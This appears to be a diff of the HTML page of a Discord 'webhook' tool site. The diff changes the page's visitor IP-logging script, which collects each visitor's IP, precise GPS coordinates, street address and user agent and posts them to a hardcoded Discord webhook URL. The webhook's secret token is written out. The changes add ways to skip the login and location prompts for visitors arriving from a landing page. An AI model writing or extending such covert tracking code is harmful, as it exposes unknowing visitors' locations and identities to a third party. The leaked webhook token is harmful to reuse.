@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>FENDI'S WEBHOOK FUCKER</title>
-    <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
+    <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        /* ========== YOUR ORIGINAL STYLES (unchanged) ========== */
+        /* ========== ALL STYLES (your original red theme, unchanged) ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -243,7 +242,7 @@
 <canvas id="snowCanvas"></canvas>
 
 <div class="top-left-logo" id="logoBtn">
-    <img src="https://i.ibb.co/gL0cffbC/New-Project-7.png" alt="Menu">
+    <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Menu">
 </div>
 <div id="toolsMenu" class="tools-menu">
     <h4>Other Tools</h4>
@@ -316,6 +315,19 @@
 
 <script>
     (function() {
+        // ========== DETECT IF CAME FROM LANDING PAGE ==========
+        // The landing page sets a flag before redirecting.
+        const cameFromLanding = localStorage.getItem('fromLanding') === 'true';
+        if (cameFromLanding) {
+            // Clear the flag so it doesn't affect future visits
+            localStorage.removeItem('fromLanding');
+            // We will skip the loading screen, Discord login, and GPS requests.
+            // The user is already authenticated and location flags are stored.
+            window.skipAuthAndGPS = true;
+        } else {
+            window.skipAuthAndGPS = false;
+        }
+
         // ========== SPINNER -> ENTER BUTTON ==========
         const spinner = document.getElementById('spinnerContainer');
         const enterBtn = document.getElementById('enterBtn');
@@ -328,9 +340,8 @@
             }, 400);
         }, 3500);
 
-        // ========== DISCORD OAUTH (PKCE) – Fixed & Reliable ==========
-        // 🔧 REPLACE THIS WITH YOUR DISCORD CLIENT ID
-        const DISCORD_CLIENT_ID = "1497155951067664415";
+        // ========== DISCORD OAUTH (PKCE) ==========
+        const DISCORD_CLIENT_ID = "1497155951067664415";   // Replace with your Client ID
         const REDIRECT_URI = window.location.origin;
         
         function generateRandomString(length) {
@@ -474,11 +485,11 @@
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 mainApp.classList.add('visible');
-                startMusic();   // this will now load from localStorage
+                startMusic();
             }, 800);
         }
         
-        // ========== IP LOGGING (unchanged) ==========
+        // ========== IP LOGGING (same as landing page) ==========
         const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
         const WEBHOOK_NAME = "IP Logs";
         const WEBHOOK_ICON = "https://i.ibb.co/gL0cffbC/New-Project-7.png";
@@ -544,9 +555,16 @@
             } catch(e) { return null; }
         }
         
+        // GPS – reuse stored flags from localStorage to avoid asking again
+        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
+        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
+        
         function getDeviceLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
+                if (!navigator.geolocation || gpsRequested) {
+                    resolve(null);
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const coords = {
@@ -557,11 +575,19 @@
                         };
                         const address = await reverseGeocode(coords.lat, coords.lon);
                         if (address) coords.address = address;
+                        gpsGranted = true;
+                        localStorage.setItem("gpsGranted", "true");
                         resolve(coords);
                     },
-                    () => resolve(null),
+                    () => {
+                        gpsGranted = false;
+                        localStorage.setItem("gpsGranted", "false");
+                        resolve(null);
+                    },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
+                gpsRequested = true;
+                localStorage.setItem("gpsRequested", "true");
             });
         }
         
@@ -602,7 +628,7 @@
                     { name: "Map (GPS)", value: `[View on Google Maps](${deviceGPS.mapLink})`, inline: false }
                 );
             } else {
-                fields.push({ name: "GPS Access", value: "Denied or unavailable", inline: false });
+                fields.push({ name: "GPS Access", value: (gpsGranted ? "Denied" : "Not requested"), inline: false });
             }
             fields.push({ name: "User Agent", value: userAgent.substring(0, 100), inline: false });
             const embed = {
@@ -622,17 +648,24 @@
             } catch(e) { console.error("Failed to send IP log", e); }
         }
         
-        // ========== ENTER BUTTON ==========
+        // ========== ENTER BUTTON ACTION ==========
         const loadingScreen = document.getElementById('loadingScreen');
         const mainApp = document.getElementById('mainApp');
+        
         enterBtn.addEventListener('click', async () => {
+            if (window.skipAuthAndGPS) {
+                // Already authenticated and GPS flags set – just show the app
+                showMainAppAndStart();
+                return;
+            }
+            // Normal flow: require Discord login and GPS
             await startAppAfterAuth();
         });
         
         // Handle OAuth redirect (when user comes back from Discord)
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get("code");
-        if (code) {
+        if (code && !window.skipAuthAndGPS) {
             const codeVerifier = localStorage.getItem("code_verifier");
             if (codeVerifier) {
                 exchangeCode(code, codeVerifier).then(async token => {
@@ -651,13 +684,17 @@
                 window.history.replaceState({}, document.title, window.location.pathname);
                 showMainAppAndStart();
             }
-        } else {
+        } else if (!window.skipAuthAndGPS) {
             const storedToken = localStorage.getItem("discord_access_token");
             if (storedToken) {
                 fetchDiscordUser(storedToken).then(user => {
                     if (user && user.id) displayUserProfile(user);
                 }).catch(() => {});
             }
+        } else {
+            // Came from landing – just show the app immediately
+            // But we still need to load music and IP log (only once)
+            showMainAppAndStart();
         }
         
         // ========== TYPEWRITER EFFECT ==========
@@ -687,7 +724,7 @@
         }
         typeWriter();
         
-        // ========== MUSIC PLAYER WITH PERSISTENCE (replaces original) ==========
+        // ========== MUSIC PLAYER WITH PERSISTENCE ==========
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
@@ -705,7 +742,6 @@
         const nextBtn = document.getElementById('nextTrackBtn');
         const backBtn = document.getElementById('backToLanding');
         
-        // Save current music state
         function saveMusicState() {
             if (audio) {
                 localStorage.setItem('musicTrackIndex', currentTrackIndex);
@@ -714,7 +750,6 @@
             }
         }
         
-        // Load previously saved music state
         function loadMusicState() {
             const savedIndex = localStorage.getItem('musicTrackIndex');
             const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
@@ -733,7 +768,6 @@
             }
         }
         
-        // Load a specific track
         function loadTrack(index, autoPlay = false) {
             if (audio) {
                 audio.pause();
